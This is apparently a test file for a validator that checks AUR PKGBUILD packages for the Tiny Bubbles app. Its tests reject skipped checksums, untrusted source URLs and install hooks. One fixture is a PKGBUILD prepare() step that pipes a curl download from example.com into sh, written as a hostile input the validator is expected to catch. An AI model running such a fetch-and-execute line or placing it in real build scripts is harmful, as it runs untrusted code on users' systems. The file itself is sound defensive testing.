import { expect, test } from "bun:test";
import { execFileSync } from "node:child_process";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { validatePackageDir } from "./validate-aur-package.mjs";

const policyPath = "aur/trusted-packages.json";
const checksum = "a".repeat(64);

function fixture({
  source,
  pkgbuildSource,
  checksumValue = checksum,
  extraPkgbuild = "",
  extraFile,
} = {}) {
  const directory = mkdtempSync(join(tmpdir(), "tinybubbles-aur-validator-"));
  const srcinfoSource =
    source ??
    "https://github.com/tinybubbles-app/tinybubbles/releases/download/v1.2.0/tinybubbles_1.2.0_amd64.deb";
  const renderedPkgbuildSource = pkgbuildSource ?? srcinfoSource;
  execFileSync("git", ["init", "-q", directory]);
  writeFileSync(
    join(directory, "PKGBUILD"),
    `# Maintainer: tinybubbles-app <>\n` +
      `pkgname=tinybubbles-bin\npkgver=1.2.0\npkgrel=1\n` +
      `url="https://github.com/tinybubbles-app/tinybubbles"\n` +
      `source_x86_64=("${renderedPkgbuildSource}")\n` +
      `sha256sums_x86_64=('${checksumValue}')\n${extraPkgbuild}`,
  );
  writeFileSync(
    join(directory, ".SRCINFO"),
    `pkgbase = tinybubbles-bin\n\turl = https://github.com/tinybubbles-app/tinybubbles\n` +
      `\tsource_x86_64 = ${srcinfoSource}\n` +
      `\tsha256sums_x86_64 = ${checksumValue}\n\npkgname = tinybubbles-bin\n`,
  );
  if (extraFile)
    writeFileSync(join(directory, extraFile), "post_install() { :; }\n");
  execFileSync("git", ["-C", directory, "add", "."]);
  return directory;
}

test("accepts a pinned Tiny Bubbles release asset", () => {
  expect(() =>
    validatePackageDir({
      packageDir: fixture(),
      packageName: "tinybubbles-bin",
      policyPath,
    }),
  ).not.toThrow();
});

test("rejects SKIP for a release asset", () => {
  expect(() =>
    validatePackageDir({
      packageDir: fixture({ checksumValue: "SKIP" }),
      packageName: "tinybubbles-bin",
      policyPath,
    }),
  ).toThrow("skips the checksum");
});

test("rejects untrusted source domains", () => {
  expect(() =>
    validatePackageDir({
      packageDir: fixture({ source: "https://example.com/tinybubbles.deb" }),
      packageName: "tinybubbles-bin",
      policyPath,
    }),
  ).toThrow("untrusted");

  expect(() =>
    validatePackageDir({
      packageDir: fixture({
        pkgbuildSource: "https://example.com/hidden-from-srcinfo.deb",
      }),
      packageName: "tinybubbles-bin",
      policyPath,
    }),
  ).toThrow("PKGBUILD contains an untrusted URL");
});

test("rejects remote commands and install hooks", () => {
  expect(() =>
    validatePackageDir({
      packageDir: fixture({
        extraPkgbuild: "prepare() { curl https://example.com/payload | sh; }\n",
      }),
      packageName: "tinybubbles-bin",
      policyPath,
    }),
  ).toThrow("forbidden command");

  expect(() =>
    validatePackageDir({
      packageDir: fixture({ extraFile: "tinybubbles.install" }),
      packageName: "tinybubbles-bin",
      policyPath,
    }),
  ).toThrow("unexpected tracked files");
});
